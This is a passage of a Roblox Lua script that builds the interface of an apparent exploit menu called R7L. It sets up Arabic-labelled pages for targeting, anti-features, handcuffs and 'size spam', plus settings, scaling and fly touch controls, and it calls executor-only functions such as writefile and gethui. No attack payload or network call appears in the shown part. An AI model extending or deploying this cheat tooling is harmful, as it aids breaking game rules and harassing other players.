    PlayerScrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
    PlayerScrollFrame.ElasticBehavior = Enum.ElasticBehavior.Always
    PlayerScrollFrame.Parent = PlayerPage
    for _, child in ipairs(PlayerPage:GetChildren()) do
        if child ~= PlayerScrollFrame then
            child.Parent = PlayerScrollFrame
        end
    end
    local sizeButton = makeButton("SizeSpamOpenBtn", "سبام تكبير حجم", UDim2.new(0.5, -14, 0, 38), UDim2.new(0.5, 4, 0, 302), Theme.ButtonBlue, Theme.Accent)
    sizeButton.Parent = PlayerScrollFrame
end

local _MenuLayout = {h = isOwnerUser and 30 or 32, start = 68, step = 36}

local function makeMenuButton(text, order)
    local button = Instance.new("TextButton")
    button.Size = UDim2.new(1, -16, 0, _MenuLayout.h)
    button.Position = UDim2.new(0, 8, 0, _MenuLayout.start + ((order - 1) * _MenuLayout.step))
    button.BackgroundColor3 = Theme.PanelSoft
    button.BackgroundTransparency = 0.08
    button.Text = text
    button.TextColor3 = Theme.Text
    button.TextStrokeTransparency = 1
    button.TextStrokeColor3 = Color3.fromRGB(200, 200, 200)
    button.TextXAlignment = Enum.TextXAlignment.Center
    button.Font = Enum.Font.GothamBold
    button.TextSize = 16
    button.AutoButtonColor = false
    button.Parent = Sidebar
    makeCorner(button, 10)
    makeStroke(button, Theme.Border, 1, 0.15)
    return button
end

local MainMenuBtn = makeMenuButton("القائمة الرئيسية", 1)
local PlayerMenuBtn = makeMenuButton("اللاعب", 2)
local TargetMenuBtn = makeMenuButton("استهداف", 3)
local ImportantMenuBtn = makeMenuButton("اخبار", 7)
UsersMenuBtn = nil
local OwnerMenuBtn = nil

local OthersMenuBtn = makeMenuButton("اخرى", 6)
local MudadatMenuBtn = makeMenuButton("مضادات", 4)
KlabshatMenuBtn = makeMenuButton("كلبشات", 5)
local AIMenuBtn = makeMenuButton("R7L AI", 8)
local SettingsMenuBtn = makeMenuButton("الاعدادات", 9)

_T18LangY = _MenuLayout.start + 4 * _MenuLayout.step + _MenuLayout.h + 8
_T18ArBtn = nil
_T18EnBtn = nil
_T18LangSelectorBtn = nil

local SubscribersMenuBtn = nil
if isOwnerUser then
    OwnerMenuBtn = makeMenuButton(" اونر", 10)
    SubscribersMenuBtn = makeMenuButton(" للمشتركين", 11)
end

local Pages = {
    main = MainPage,
    player = PlayerPage,
    target = TargetPage,
    important = ImportantPage,
    ai = AIPage,
}

local MenuButtons = {
    main = MainMenuBtn,
    player = PlayerMenuBtn,
    target = TargetMenuBtn,
    important = ImportantMenuBtn,
    ai = AIMenuBtn,
}

if OwnerPage and OwnerMenuBtn then
    Pages.owner = OwnerPage
    MenuButtons.owner = OwnerMenuBtn
end

if SubscribersPage and SubscribersMenuBtn then
    Pages.subscribers = SubscribersPage
    MenuButtons.subscribers = SubscribersMenuBtn
end

Pages.others = OthersPage
MenuButtons.others = OthersMenuBtn
Pages.mudadat = MudadatPage
MenuButtons.mudadat = MudadatMenuBtn
Pages.klabshat = KlabshatPage
MenuButtons.klabshat = KlabshatMenuBtn
local SettingsPage = makePage("SettingsPage")
makePageTitle(SettingsPage, "الاعدادات", "تخصيص الواجهة")
Pages.settings = SettingsPage
MenuButtons.settings = SettingsMenuBtn

_T18ColorBtn = nil
do

    local _LangSecLabel = Instance.new("TextLabel")
    _LangSecLabel.Size = UDim2.new(1, -24, 0, 18)
    _LangSecLabel.Position = UDim2.new(0, 12, 0, 62)
    _LangSecLabel.BackgroundTransparency = 1
    _LangSecLabel.Text = " اللغة"
    _LangSecLabel.TextColor3 = Color3.fromRGB(140, 145, 170)
    _LangSecLabel.TextXAlignment = Enum.TextXAlignment.Right
    _LangSecLabel.Font = Enum.Font.GothamBold
    _LangSecLabel.TextSize = 12
    _LangSecLabel.ZIndex = 3
    _LangSecLabel.Parent = SettingsPage

    _T18LangSelectorBtn = Instance.new("TextButton")
    _T18LangSelectorBtn.Name = "LangSelectorBtn"
    _T18LangSelectorBtn.Size = UDim2.new(1, -24, 0, 42)
    _T18LangSelectorBtn.Position = UDim2.new(0, 12, 0, 84)
    _T18LangSelectorBtn.BackgroundColor3 = Theme.PanelSoft
    _T18LangSelectorBtn.BackgroundTransparency = 0.05
    _T18LangSelectorBtn.Text = "  اللغة  "
    _T18LangSelectorBtn.TextColor3 = Theme.Text
    _T18LangSelectorBtn.Font = Enum.Font.GothamBold
    _T18LangSelectorBtn.TextSize = 14
    _T18LangSelectorBtn.AutoButtonColor = false
    _T18LangSelectorBtn.ZIndex = 5
    _T18LangSelectorBtn.Parent = SettingsPage
    makeCorner(_T18LangSelectorBtn, 10)
    makeStroke(_T18LangSelectorBtn, Theme.Border, 1, 0.15)

    local _LangDropdown = Instance.new("Frame")
    _LangDropdown.Name = "LangDropdown"
    _LangDropdown.Size = UDim2.new(1, -24, 0, 96)
    _LangDropdown.Position = UDim2.new(0, 12, 0, 130)
    _LangDropdown.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    _LangDropdown.BackgroundTransparency = 0.05
    _LangDropdown.Visible = false
    _LangDropdown.ZIndex = 20
    _LangDropdown.Parent = SettingsPage
    makeCorner(_LangDropdown, 10)
    makeStroke(_LangDropdown, Theme.Border, 1, 0.1)

    local _LangDivider = Instance.new("Frame")
    _LangDivider.Size = UDim2.new(1, -20, 0, 1)
    _LangDivider.Position = UDim2.new(0, 10, 0, 48)
    _LangDivider.BackgroundColor3 = Theme.Border
    _LangDivider.BackgroundTransparency = 0.5
    _LangDivider.BorderSizePixel = 0
    _LangDivider.ZIndex = 21
    _LangDivider.Parent = _LangDropdown

    _T18ArBtn = Instance.new("TextButton")
    _T18ArBtn.Name = "ArBtn"
    _T18ArBtn.Size = UDim2.new(1, -12, 0, 38)
    _T18ArBtn.Position = UDim2.new(0, 6, 0, 5)
    _T18ArBtn.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    _T18ArBtn.BackgroundTransparency = 0
    _T18ArBtn.BorderSizePixel = 0
    _T18ArBtn.Text = "    العربية"
    _T18ArBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
    _T18ArBtn.Font = Enum.Font.GothamBold
    _T18ArBtn.TextSize = 14
    _T18ArBtn.AutoButtonColor = false
    _T18ArBtn.ZIndex = 21
    _T18ArBtn.Parent = _LangDropdown
    makeCorner(_T18ArBtn, 8)

    _T18EnBtn = Instance.new("TextButton")
    _T18EnBtn.Name = "EnBtn"
    _T18EnBtn.Size = UDim2.new(1, -12, 0, 38)
    _T18EnBtn.Position = UDim2.new(0, 6, 0, 53)
    _T18EnBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    _T18EnBtn.BackgroundTransparency = 0
    _T18EnBtn.BorderSizePixel = 0
    _T18EnBtn.Text = "       English"
    _T18EnBtn.TextColor3 = Color3.fromRGB(160, 160, 160)
    _T18EnBtn.Font = Enum.Font.GothamBold
    _T18EnBtn.TextSize = 14
    _T18EnBtn.AutoButtonColor = false
    _T18EnBtn.ZIndex = 21
    _T18EnBtn.Parent = _LangDropdown
    makeCorner(_T18EnBtn, 8)

    _T18LangSelectorBtn.MouseButton1Click:Connect(function()
        local _opening = not _LangDropdown.Visible
        _LangDropdown.Visible = _opening
        if _T18ColorBtn then
            local _targetY = _opening and 258 or 158
            TweenService:Create(
                _T18ColorBtn,
                TweenInfo.new(0.25, Enum.EasingStyle.Quart, Enum.EasingDirection.Out),
                { Position = UDim2.new(0, 12, 0, _targetY) }
            ):Play()
        end
    end)
end

_T18ColorTheme      = "default"
_T18ColorDefaultBtn = nil
_T18ColorPinkBtn    = nil
_T18ColorSecLabel   = nil

do
    _T18ColorSecLabel = Instance.new("TextLabel")
    _T18ColorSecLabel.Size = UDim2.new(1, -24, 0, 18)
    _T18ColorSecLabel.Position = UDim2.new(0, 12, 0, 136)
    _T18ColorSecLabel.BackgroundTransparency = 1
    _T18ColorSecLabel.Text = " اللون"
    _T18ColorSecLabel.TextColor3 = Color3.fromRGB(140, 145, 170)
    _T18ColorSecLabel.TextXAlignment = Enum.TextXAlignment.Right
    _T18ColorSecLabel.Font = Enum.Font.GothamBold
    _T18ColorSecLabel.TextSize = 12
    _T18ColorSecLabel.ZIndex = 3
    _T18ColorSecLabel.Parent = SettingsPage

    _T18ColorBtn = Instance.new("TextButton")
    _T18ColorBtn.Name = "ColorSelectorBtn"
    _T18ColorBtn.Size = UDim2.new(1, -24, 0, 42)
    _T18ColorBtn.Position = UDim2.new(0, 12, 0, 158)
    _T18ColorBtn.BackgroundColor3 = Theme.PanelSoft
    _T18ColorBtn.BackgroundTransparency = 0.05
    _T18ColorBtn.Text = "  اللون  "
    _T18ColorBtn.TextColor3 = Theme.Text
    _T18ColorBtn.Font = Enum.Font.GothamBold
    _T18ColorBtn.TextSize = 14
    _T18ColorBtn.AutoButtonColor = false
    _T18ColorBtn.ZIndex = 5
    _T18ColorBtn.Parent = SettingsPage
    makeCorner(_T18ColorBtn, 10)
    makeStroke(_T18ColorBtn, Theme.Border, 1, 0.15)

    _T18ColorBtn.Interactable = false
    _T18ColorBtn.TextColor3 = Color3.fromRGB(70, 70, 80)
    _T18ColorBtn.BackgroundTransparency = 0.55
    local _ColorSoon = Instance.new("TextLabel", _T18ColorBtn)
    _ColorSoon.Size = UDim2.new(0, 52, 0, 20)
    _ColorSoon.Position = UDim2.new(0, 8, 0.5, -10)
    _ColorSoon.BackgroundColor3 = Color3.fromRGB(180, 100, 0)
    _ColorSoon.BackgroundTransparency = 0
    _ColorSoon.Text = "قريباً"
    _ColorSoon.TextColor3 = Color3.fromRGB(255, 255, 255)
    _ColorSoon.Font = Enum.Font.GothamBold
    _ColorSoon.TextSize = 11
    _ColorSoon.BorderSizePixel = 0
    _ColorSoon.ZIndex = 200
    makeCorner(_ColorSoon, 6)

    local _ColorDropdown = Instance.new("Frame")
    _ColorDropdown.Name = "ColorDropdown"
    _ColorDropdown.Size = UDim2.new(1, -24, 0, 96)
    _ColorDropdown.Position = UDim2.new(0, 12, 0, 208)
    _ColorDropdown.BackgroundColor3 = Color3.fromRGB(18, 18, 22)
    _ColorDropdown.BackgroundTransparency = 0.05
    _ColorDropdown.Visible = false
    _ColorDropdown.ZIndex = 20
    _ColorDropdown.Parent = SettingsPage
    makeCorner(_ColorDropdown, 10)
    makeStroke(_ColorDropdown, Theme.Border, 1, 0.1)

    local _ColorDiv = Instance.new("Frame")
    _ColorDiv.Size = UDim2.new(1, -20, 0, 1)
    _ColorDiv.Position = UDim2.new(0, 10, 0, 48)
    _ColorDiv.BackgroundColor3 = Theme.Border
    _ColorDiv.BackgroundTransparency = 0.5
    _ColorDiv.BorderSizePixel = 0
    _ColorDiv.ZIndex = 21
    _ColorDiv.Parent = _ColorDropdown

    _T18ColorDefaultBtn = Instance.new("TextButton")
    _T18ColorDefaultBtn.Name = "DefaultBtn"
    _T18ColorDefaultBtn.Size = UDim2.new(1, -12, 0, 38)
    _T18ColorDefaultBtn.Position = UDim2.new(0, 6, 0, 5)
    _T18ColorDefaultBtn.BackgroundColor3 = Color3.fromRGB(220, 220, 220)
    _T18ColorDefaultBtn.BackgroundTransparency = 0
    _T18ColorDefaultBtn.BorderSizePixel = 0
    _T18ColorDefaultBtn.Text = "    Default"
    _T18ColorDefaultBtn.TextColor3 = Color3.fromRGB(20, 20, 20)
    _T18ColorDefaultBtn.Font = Enum.Font.GothamBold
    _T18ColorDefaultBtn.TextSize = 14
    _T18ColorDefaultBtn.AutoButtonColor = false
    _T18ColorDefaultBtn.ZIndex = 21
    _T18ColorDefaultBtn.Parent = _ColorDropdown
    makeCorner(_T18ColorDefaultBtn, 8)

    _T18ColorPinkBtn = Instance.new("TextButton")
    _T18ColorPinkBtn.Name = "PinkBtn"
    _T18ColorPinkBtn.Size = UDim2.new(1, -12, 0, 38)
    _T18ColorPinkBtn.Position = UDim2.new(0, 6, 0, 53)
    _T18ColorPinkBtn.BackgroundColor3 = Color3.fromRGB(28, 28, 28)
    _T18ColorPinkBtn.BackgroundTransparency = 0
    _T18ColorPinkBtn.BorderSizePixel = 0
    _T18ColorPinkBtn.Text = "       Pink"
    _T18ColorPinkBtn.TextColor3 = Color3.fromRGB(160, 160, 160)
    _T18ColorPinkBtn.Font = Enum.Font.GothamBold
    _T18ColorPinkBtn.TextSize = 14
    _T18ColorPinkBtn.AutoButtonColor = false
    _T18ColorPinkBtn.ZIndex = 21
    _T18ColorPinkBtn.Parent = _ColorDropdown
    makeCorner(_T18ColorPinkBtn, 8)

    local function _markColorActive(theme)
        local isDefault = (theme == "default")
        _T18ColorDefaultBtn.BackgroundColor3 = isDefault and Color3.fromRGB(220, 220, 220) or Color3.fromRGB(28, 28, 28)
        _T18ColorDefaultBtn.TextColor3       = isDefault and Color3.fromRGB(20, 20, 20)   or Color3.fromRGB(160, 160, 160)
        _T18ColorDefaultBtn.Text             = (isDefault and "  " or "     ") .. "  Default"
        _T18ColorPinkBtn.BackgroundColor3    = (not isDefault) and Color3.fromRGB(220, 220, 220) or Color3.fromRGB(28, 28, 28)
        _T18ColorPinkBtn.TextColor3          = (not isDefault) and Color3.fromRGB(20, 20, 20)   or Color3.fromRGB(160, 160, 160)
        _T18ColorPinkBtn.Text               = ((not isDefault) and "  " or "     ") .. "  Pink"
        _T18ColorTheme = theme
    end

    _T18ColorBtn.MouseButton1Click:Connect(function()
        _ColorDropdown.Visible = not _ColorDropdown.Visible
    end)

    _T18ColorDefaultBtn.MouseButton1Click:Connect(function()
        if _T18ColorTheme == "default" then _ColorDropdown.Visible = false; return end
        _markColorActive("default")
        pcall(function()
            local fg = Frame:FindFirstChildOfClass("UIGradient")
            if fg then fg.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0,    Color3.fromRGB(12,15,35)),
                ColorSequenceKeypoint.new(0.55, Color3.fromRGB(9,12,28)),
                ColorSequenceKeypoint.new(1,    Color3.fromRGB(2,2,2)),
            }) end
            Frame.BackgroundColor3 = Theme.Panel
            Header.BackgroundColor3 = Theme.Header
            local hg = Header:FindFirstChildOfClass("UIGradient")
            if hg then hg.Color = ColorSequence.new({
                ColorSequenceKeypoint.new(0, Color3.fromRGB(6,6,6)),
                ColorSequenceKeypoint.new(1, Color3.fromRGB(8,10,24)),
            }) end
            if Sidebar    then Sidebar.BackgroundColor3    = Theme.Panel     end
            if SidebarHost then SidebarHost.BackgroundColor3 = Theme.PanelSoft end
            if ContentPanel then ContentPanel.BackgroundColor3 = Theme.PanelSoft end
            if PagesHost  then PagesHost.BackgroundColor3  = Theme.PanelSoft end
            for _, v in ipairs(Sidebar:GetDescendants()) do
                if v:IsA("TextButton") then v.BackgroundColor3 = Theme.PanelSoft end
            end
            for _, page in pairs(Pages) do
                for _, v in ipairs(page:GetDescendants()) do
                    if v:IsA("TextButton") and v.AutoButtonColor == false then
                        v.BackgroundColor3 = Theme.ButtonBlue
                    end
                end
            end
            for _, v in ipairs(OthersPage:GetDescendants()) do
                if v:IsA("TextButton") and v.AutoButtonColor == false then
                    v.BackgroundColor3 = Theme.ButtonBlue
                end
            end
            for _, v in ipairs(SettingsPage:GetDescendants()) do
                if v:IsA("TextButton") and v.AutoButtonColor == false then
                    v.BackgroundColor3 = Theme.PanelSoft
                end
            end
            if ToggleBtn then
                ToggleBtn.BackgroundColor3 = Theme.PanelSoft
                local tg = ToggleBtn:FindFirstChildOfClass("UIGradient")
                if tg then tg.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(14,14,14)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(6,6,6)),
                }) end
            end
            if ChatBubbleBtn then ChatBubbleBtn.BackgroundColor3 = Theme.PanelSoft end
        end)
        _ColorDropdown.Visible = false
    end)

    _T18ColorPinkBtn.MouseButton1Click:Connect(function()
        if _T18ColorTheme == "pink" then _ColorDropdown.Visible = false; return end
        _markColorActive("pink")
        pcall(function()

            local P_bg    = Color3.fromRGB(255,188,225)
            local P_panel = Color3.fromRGB(255,175,220)
            local P_btn   = Color3.fromRGB(255,190,228)

            local function pinkGrad(inst, c0, c1, rot)
                local g = inst:FindFirstChildOfClass("UIGradient")
                if not g then g = Instance.new("UIGradient"); g.Parent = inst end
                g.Color = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, c0),
                    ColorSequenceKeypoint.new(1, c1),
                })
                if rot then g.Rotation = rot end
                g.Enabled = true
            end

            Frame.BackgroundColor3 = P_bg
            Frame.BackgroundTransparency = 0
            pinkGrad(Frame,
                Color3.fromRGB(255,225,240),
                Color3.fromRGB(255,150,205), 135)

            Header.BackgroundColor3 = P_panel
            Header.BackgroundTransparency = 0
            pinkGrad(Header,
                Color3.fromRGB(255,185,228),
                Color3.fromRGB(255,155,210), 15)

            for _, v in ipairs(Frame:GetDescendants()) do
                if v:IsA("TextButton") and v.AutoButtonColor == false then

                    local c = v.BackgroundColor3
                    if c.R < 0.85 or c.G < 0.55 then
                        v.BackgroundColor3 = P_btn
                        v.BackgroundTransparency = 0
                    end
                elseif v:IsA("Frame") and not v:IsA("TextButton") then

                    local c = v.BackgroundColor3
                    local dark = (c.R + c.G + c.B) < 0.9
                    if dark and v.BackgroundTransparency < 0.92 then
                        v.BackgroundColor3 = P_panel
                        v.BackgroundTransparency = math.min(v.BackgroundTransparency, 0.12)
                        local g = v:FindFirstChildOfClass("UIGradient")
                        if g then
                            g.Color = ColorSequence.new({
                                ColorSequenceKeypoint.new(0, Color3.fromRGB(255,205,238)),
                                ColorSequenceKeypoint.new(1, Color3.fromRGB(255,160,215)),
                            })
                            g.Enabled = true
                        end
                    end
                end
            end

            if ToggleBtn then
                ToggleBtn.BackgroundColor3 = P_btn
                ToggleBtn.BackgroundTransparency = 0
                pinkGrad(ToggleBtn,
                    Color3.fromRGB(255,200,235),
                    Color3.fromRGB(255,160,215), 45)
            end

            if ChatBubbleBtn then
                ChatBubbleBtn.BackgroundColor3 = P_btn
                ChatBubbleBtn.BackgroundTransparency = 0
            end
        end)
        _ColorDropdown.Visible = false
    end)
end

do
    local _SzSecLbl = Instance.new("TextLabel")
    _SzSecLbl.Size = UDim2.new(1,-24,0,18)
    _SzSecLbl.Position = UDim2.new(0,12,0,214)
    _SzSecLbl.BackgroundTransparency = 1
    _SzSecLbl.Text = " الحجم"
    _SzSecLbl.TextColor3 = Color3.fromRGB(140,145,170)
    _SzSecLbl.TextXAlignment = Enum.TextXAlignment.Right
    _SzSecLbl.Font = Enum.Font.GothamBold
    _SzSecLbl.TextSize = 12
    _SzSecLbl.ZIndex = 3
    _SzSecLbl.Parent = SettingsPage

    local _SzBtn = Instance.new("TextButton")
    _SzBtn.Name = "SizeSelectorBtn"
    _SzBtn.Size = UDim2.new(1,-24,0,42)
    _SzBtn.Position = UDim2.new(0,12,0,234)
    _SzBtn.BackgroundColor3 = Theme.PanelSoft
    _SzBtn.BackgroundTransparency = 0.05
    _SzBtn.Text = "  الحجم  "
    _SzBtn.TextColor3 = Theme.Text
    _SzBtn.Font = Enum.Font.GothamBold
    _SzBtn.TextSize = 14
    _SzBtn.AutoButtonColor = false
    _SzBtn.ZIndex = 5
    _SzBtn.Parent = SettingsPage
    makeCorner(_SzBtn, 10)
    makeStroke(_SzBtn, Theme.Border, 1, 0.15)

    _SzBtn.MouseEnter:Connect(function() TweenService:Create(_SzBtn, TweenInfo.new(0.15), { BackgroundColor3 = Theme.ButtonDefaultAlt }):Play() end)
    _SzBtn.MouseLeave:Connect(function() TweenService:Create(_SzBtn, TweenInfo.new(0.15), { BackgroundColor3 = Theme.PanelSoft }):Play() end)

    local _SzDrop = Instance.new("Frame")
    _SzDrop.Name = "SizeDropdown"
    _SzDrop.Size = UDim2.new(1,-24,0,242)
    _SzDrop.Position = UDim2.new(0,12,0,282)
    _SzDrop.BackgroundColor3 = Color3.fromRGB(18,18,22)
    _SzDrop.BackgroundTransparency = 0.05
    _SzDrop.Visible = false
    _SzDrop.ZIndex = 20
    _SzDrop.Parent = SettingsPage
    makeCorner(_SzDrop, 10)
    makeStroke(_SzDrop, Theme.Border, 1, 0.1)

    local _szOpts = {
        {t="  افتراضي",   k=1.00},
        {t="   كبير",      k=1.15},
        {t="   كبير جداً", k=1.30},
        {t="   متوسط",    k=0.90},
        {t="   صغير",     k=0.78},
    }
    local _szIdx = 1
    for i, o in ipairs(_szOpts) do if math.abs(o.k - (_T18UserScale or 1)) < 0.001 then _szIdx = i end end
    local function _szName(i) return (_szOpts[i].t:gsub("^[%s]+", "")) end
    _SzBtn.Text = "  " .. T18T("الحجم") .. " : " .. T18T(_szName(_szIdx)) .. "  "
    local _szBtns = {}
    for i, opt in ipairs(_szOpts) do
        local sb = Instance.new("TextButton")
        sb.Size = UDim2.new(1,-12,0,38)
        sb.Position = UDim2.new(0,6,0,(i-1)*47+5)
        sb.BackgroundColor3 = (i==_szIdx) and Color3.fromRGB(220,220,220) or Color3.fromRGB(28,28,28)
        sb.TextColor3 = (i==_szIdx) and Color3.fromRGB(20,20,20) or Color3.fromRGB(160,160,160)
        sb.BorderSizePixel = 0
        sb.Text = opt.t
        sb.Font = Enum.Font.GothamBold
        sb.TextSize = 14
        sb.AutoButtonColor = false
        sb.ZIndex = 21
        sb.Parent = _SzDrop
        makeCorner(sb, 8)
        _szBtns[i] = sb
        sb.MouseButton1Click:Connect(function()
            if _szIdx == i then _SzDrop.Visible = false; return end
            _szIdx = i
            for j, b2 in ipairs(_szBtns) do
                local sel = (j==i)
                b2.BackgroundColor3 = sel and Color3.fromRGB(220,220,220) or Color3.fromRGB(28,28,28)
                b2.TextColor3 = sel and Color3.fromRGB(20,20,20) or Color3.fromRGB(160,160,160)
                local raw = _szOpts[j].t:gsub("^[%s]+","")
                b2.Text = (sel and "  " or "   ") .. raw
            end
            _T18UserScale = opt.k
            pcall(function() if writefile then writefile("R7L_size.txt", tostring(opt.k)) end end)
            pcall(updateResponsiveLayout)
            pcall(_T18ApplyUserScale)
            _SzBtn.Text = "  " .. T18T("الحجم") .. " : " .. T18T(_szName(i)) .. "  "
            _SzDrop.Visible = false
        end)
    end
    -- grow/shrink the settings scroll so the dropdown is never cut off
    local _SZ_BASE_CANVAS = 430
    local function _szFitCanvas()
        local sc = _SzDrop.Parent
        if not (sc and sc:IsA("ScrollingFrame")) then return end
        if _SzDrop.Visible then
            local bottom = _SzDrop.Position.Y.Offset + _SzDrop.Size.Y.Offset + 14
            sc.CanvasSize = UDim2.new(0, 0, 0, math.max(_SZ_BASE_CANVAS, bottom))
            local viewH = sc.AbsoluteWindowSize.Y
            local k = (sc.AbsoluteCanvasSize.Y > 0) and (sc.AbsoluteCanvasSize.Y / sc.CanvasSize.Y.Offset) or 1
            local target = math.max(0, bottom - viewH / math.max(k, 0.01))
            TweenService:Create(sc, TweenInfo.new(0.3, Enum.EasingStyle.Quart, Enum.EasingDirection.Out), { CanvasPosition = Vector2.new(0, target) }):Play()
        else
            sc.CanvasSize = UDim2.new(0, 0, 0, _SZ_BASE_CANVAS)
            local maxY = math.max(0, sc.AbsoluteCanvasSize.Y - sc.AbsoluteWindowSize.Y)
            if sc.CanvasPosition.Y > maxY then sc.CanvasPosition = Vector2.new(0, maxY) end
        end
    end
    _SzDrop:GetPropertyChangedSignal("Visible"):Connect(function() task.defer(_szFitCanvas) end)
    _SzBtn.MouseButton1Click:Connect(function()
        _SzDrop.Visible = not _SzDrop.Visible
    end)
end

-- ===== R7L global UI scale (applies to every R7L gui, incl. separate popups) =====
do
    local watched = {}
    local function isOurGui(g)
        if not g:IsA("ScreenGui") then return false end
        local n = g.Name
        return n == "BangGuiPro" or n:sub(1, 3) == "T18" or n:sub(1, 3) == "R7L"
    end
    local function scaleChild(obj)
        if not obj:IsA("GuiObject") then return end
        if obj == Frame then return end                       -- main window uses FrameScale
        if obj:GetAttribute("T18OwnScale") then              -- HUD cards handle their own scale
            local sc = obj:FindFirstChildOfClass("UIScale")
            if sc then sc.Scale = _T18UserScale end
            return
        end
        local mine = obj:FindFirstChild("T18UserScale")
        if not mine then
            if obj:FindFirstChildOfClass("UIScale") then return end
            mine = Instance.new("UIScale")
            mine.Name = "T18UserScale"
            mine.Parent = obj
        end
        mine.Scale = _T18UserScale
    end
    local function watchGui(g)
        if watched[g] or not isOurGui(g) then return end
        watched[g] = true
        for _, c in ipairs(g:GetChildren()) do pcall(scaleChild, c) end
        g.ChildAdded:Connect(function(c) task.defer(function() pcall(scaleChild, c) end) end)
        g.AncestryChanged:Connect(function(_, parent) if not parent then watched[g] = nil end end)
    end
    local function watchContainer(container)
        if not container then return end
        for _, g in ipairs(container:GetChildren()) do pcall(watchGui, g) end
        container.ChildAdded:Connect(function(g) task.defer(function() pcall(watchGui, g) end) end)
    end
    pcall(function() watchContainer(LocalPlayer:WaitForChild("PlayerGui")) end)
    pcall(function() watchContainer(game:GetService("CoreGui")) end)
    pcall(function() if gethui then watchContainer(gethui()) end end)

    function _T18ApplyUserScale()
        pcall(updateResponsiveLayout)
        for g in pairs(watched) do
            if g.Parent then for _, c in ipairs(g:GetChildren()) do pcall(scaleChild, c) end end
        end
        if _T18SessionReposition then pcall(_T18SessionReposition) end
    end
    pcall(_T18ApplyUserScale)
end

do
    local SettingsScroll = Instance.new("ScrollingFrame")
    SettingsScroll.Size = UDim2.new(1,0,1,0)
    SettingsScroll.BackgroundTransparency = 1
    SettingsScroll.BorderSizePixel = 0
    SettingsScroll.ScrollBarThickness = isTouchDevice and 3 or 4
    SettingsScroll.ScrollBarImageColor3 = Theme.Active
    SettingsScroll.CanvasSize = UDim2.new(0,0,0,430)
    SettingsScroll.ScrollingDirection = Enum.ScrollingDirection.Y
    SettingsScroll.ElasticBehavior = Enum.ElasticBehavior.Always
    SettingsScroll.Parent = SettingsPage
    for _, child in ipairs(SettingsPage:GetChildren()) do
        if child ~= SettingsScroll then child.Parent = SettingsScroll end
    end
end

local function setMenuState(activeKey)
    for key, page in pairs(Pages) do
        page.Visible = key == activeKey
    end

    for key, button in pairs(MenuButtons) do
        if key == activeKey then
            button.BackgroundColor3 = Theme.Active
        else
            button.BackgroundColor3 = Theme.PanelSoft
        end
    end
end

MainMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("main")
end)

PlayerMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("player")
end)

TargetMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("target")
end)

ImportantMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("important")
end)

if SubscribersMenuBtn then
    SubscribersMenuBtn.MouseButton1Click:Connect(function()
        setMenuState("subscribers")
    end)
end

if OwnerMenuBtn then
    OwnerMenuBtn.MouseButton1Click:Connect(function()
        setMenuState("owner")
    end)
end

OthersMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("others")
end)
MudadatMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("mudadat")
end)
KlabshatMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("klabshat")
end)
SettingsMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("settings")
end)
AIMenuBtn.MouseButton1Click:Connect(function()
    setMenuState("ai")
end)

setMenuState("main")

do
    local Footer = Instance.new("TextLabel")
    Footer.Size = UDim2.new(1, -32, 0, 18)
Footer.Position = UDim2.new(0, 16, 1, -24)
Footer.BackgroundTransparency = 1
Footer.Text = "© All rights reserved R7L"
Footer.TextColor3 = Color3.fromRGB(100, 116, 139)
Footer.TextXAlignment = Enum.TextXAlignment.Left
Footer.Font = Enum.Font.Gotham
Footer.TextSize = 13
Footer.Parent = Frame
end

ToggleBtn = Instance.new("TextButton")
ToggleBtn.Name = "Toggle"
ToggleBtn.AnchorPoint = Vector2.new(0, 0)
ToggleBtn.Size = UDim2.new(0, 54, 0, 54)
ToggleBtn.Position = UDim2.new(0, 16, 0.5, -58)
ToggleBtn.BackgroundColor3 = Theme.PanelSoft
ToggleBtn.Text = ""
ToggleBtn.AutoButtonColor = false
ToggleBtn.ZIndex = 20
ToggleBtn.Parent = ScreenGui
makeCorner(ToggleBtn, 999)
makeStroke(ToggleBtn, Theme.Border, 1, 0.15)
UiFx.makeGradient(ToggleBtn, {
    ColorSequenceKeypoint.new(0, Color3.fromRGB(14, 14, 14)),
    ColorSequenceKeypoint.new(1, Color3.fromRGB(6, 6, 6)),
}, 45)

do
    local ToggleImg = Instance.new("ImageLabel")
    ToggleImg.Size = UDim2.new(1, -22, 1, -22)
    ToggleImg.Position = UDim2.new(0, 11, 0, 11)
    ToggleImg.BackgroundTransparency = 1
    ToggleImg.Image = "rbxassetid://121790147873719"
    ToggleImg.ScaleType = Enum.ScaleType.Fit
    ToggleImg.ZIndex = 21
    ToggleImg.Parent = ToggleBtn
end

local function makeFlyTouchButton(name, text, position)
    local button = Instance.new("TextButton")
    button.Name = name
    button.Size = UDim2.new(0, 52, 0, 38)
    button.Position = position
    button.BackgroundColor3 = Theme.ButtonDefault
    button.BackgroundTransparency = 0.08
    button.Text = text
    button.TextColor3 = Theme.Text
    button.TextStrokeTransparency = 1
    button.TextStrokeColor3 = Color3.fromRGB(200, 200, 200)
    button.Font = Enum.Font.GothamBold
    button.TextSize = 16
    button.AutoButtonColor = false
    button.Parent = FlyTouchFrame
    makeCorner(button, 10)
    makeStroke(button, Theme.Border, 1, 0.08)
    return button
end

local function bindFlyTouchButton(button, inputName)
    button.InputBegan:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch
            or input.UserInputType == Enum.UserInputType.MouseButton1 then
            mobileFlyInput[inputName] = true
        end
    end)

    button.InputEnded:Connect(function(input)
        if input.UserInputType == Enum.UserInputType.Touch
            or input.UserInputType == Enum.UserInputType.MouseButton1 then
            mobileFlyInput[inputName] = false
        end
    end)
end

FlyTouchFrame = Instance.new("Frame")
FlyTouchFrame.Name = "FlyTouchControls"
FlyTouchFrame.AnchorPoint = Vector2.new(1, 1)
